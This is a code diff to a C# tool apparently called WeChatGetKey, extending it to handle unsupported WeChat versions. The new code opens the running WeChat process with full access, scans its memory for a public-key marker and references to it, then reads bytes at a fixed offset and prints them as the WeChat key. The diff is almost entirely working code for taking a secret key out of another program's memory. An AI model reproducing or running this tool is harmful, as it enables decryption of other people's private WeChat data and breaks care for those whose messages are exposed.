@@ -43,7 +43,56 @@ namespace WeChatGetKey
 						if (!Program.VersionList.TryGetValue(FileVersion, out SupportList))
 						{
 							Console.WriteLine("[-] WeChat Current Version Is: " + FileVersion + " Not Support");
+							Console.WriteLine("[+] Try To Get Address Of The WeChatKey According To Signature.");
+
+							string signString = "-----BEGIN PUBLIC KEY-----";
+							int signOffset = -216;
+							List<long> signAddressList = new List<long>();
+							IntPtr hProcess = (IntPtr)OpenProcess(PROCESS_ALL_ACCESS, false, WeChatProcess.Id);
+
+							// Search real address of searchString
+							List<long> realAddressList = SearchMemoryAll(hProcess, Encoding.UTF8.GetBytes(signString), IntPtr.Zero);
+							Console.WriteLine("total real address: {0}", realAddressList.Count);
+							foreach (long realAddress in realAddressList)
+							{
+								byte[] littleEndianBytes = BitConverter.GetBytes(realAddress);
+								// Search reference address of searchString
+								List<long> referenceAddressList = SearchMemoryAll(hProcess, littleEndianBytes, processModule.BaseAddress);
+								Console.WriteLine("total reference address: {0}", referenceAddressList.Count);
+								foreach (long referenceAddress in referenceAddressList)
+								{
+									Console.WriteLine("reference address: {0}", referenceAddress);
+									if (referenceAddress > processModule.BaseAddress.ToInt64())
+									{
+										signAddressList.Add(referenceAddress);
+										//signAddress = referenceAddress;
+										//break;
+									}
+								}
+								//if (signAddress != 0)
+								//{
+								//	break;
+								//}
+							}
+
+                            foreach (long signAddress in signAddressList)
+                            {
+								IntPtr WeChatKey = (IntPtr)(signAddress + signOffset);
+								Console.WriteLine("[+] Get Key From {0}", signAddress);
+								string HexKey = Program.GetHex(WeChatProcess.Handle, (IntPtr)WeChatKey);
+								if (string.IsNullOrWhiteSpace(HexKey))
+								{
+									continue;
+								}
+								else
+								{
+									Console.WriteLine("[+] WeChatKey: " + HexKey);
+									return;
+								}
+							}
+							Console.WriteLine("[-] WeChat Is Run, But Maybe No Login");
 							return;
+
 						}
 						break;
 					}
@@ -206,6 +255,59 @@ namespace WeChatGetKey
             }
             return Program.bytes2hex(array2);
         }
+
+		public static List<long> SearchMemoryAll(IntPtr hProcess, byte[] searchBytes, IntPtr searchAddress)
+		{
+			MEMORY_BASIC_INFORMATION memInfo;
+			List<long> address = new List<long>();
+
+			while (VirtualQueryEx(hProcess, searchAddress, out memInfo, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != IntPtr.Zero)
+			{
+				try
+				{
+					byte[] buffer = new byte[(int)memInfo.RegionSize];
+					int bytesRead = 0 ;
+
+					ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, buffer.Length, bytesRead);
+
+					int offset = IndexOfBytes(buffer, searchBytes);
+					if (offset != -1)
+					{
+						long targetAddress = memInfo.BaseAddress.ToInt64() + offset;
+						address.Add(targetAddress);
+					}
+				}
+				catch
+				{
+				}
+				finally
+				{
+					searchAddress = new IntPtr(memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64());
+				}
+			}
+			return address;
+		}
+
+		public static int IndexOfBytes(byte[] buffer, byte[] targetBytes)
+		{
+			for (int i = 0; i <= buffer.Length - targetBytes.Length; i++)
+			{
+				bool found = true;
+				for (int j = 0; j < targetBytes.Length; j++)
+				{
+					if (buffer[i + j] != targetBytes[j])
+					{
+						found = false;
+						break;
+					}
+				}
+				if (found)
+				{
+					return i;
+				}
+			}
+			return -1;
+		}
 
 		private static string bytes2hex(byte[] bytes)
 		{
@@ -694,5 +796,26 @@ namespace WeChatGetKey
             }
 		};
 		private static IntPtr WeChatWinBaseAddress = IntPtr.Zero;
+
+		[DllImport("kernel32.dll", SetLastError = true)]
+		public static extern IntPtr VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
+
+		const int PROCESS_ALL_ACCESS = 0x1F0FFF;
+		const int MEM_COMMIT = 0x1000;
+		const int MEM_PRIVATE = 0x20000;
+		const int PAGE_READWRITE = 0x04;
+		const int PAGE_READONLY = 0x02;
+
+		[StructLayout(LayoutKind.Sequential)]
+		public struct MEMORY_BASIC_INFORMATION
+		{
+			public IntPtr BaseAddress;
+			public IntPtr AllocationBase;
+			public uint AllocationProtect;
+			public IntPtr RegionSize;
+			public uint State;
+			public uint Protect;
+			public uint Type;
+		}
 	}
 }
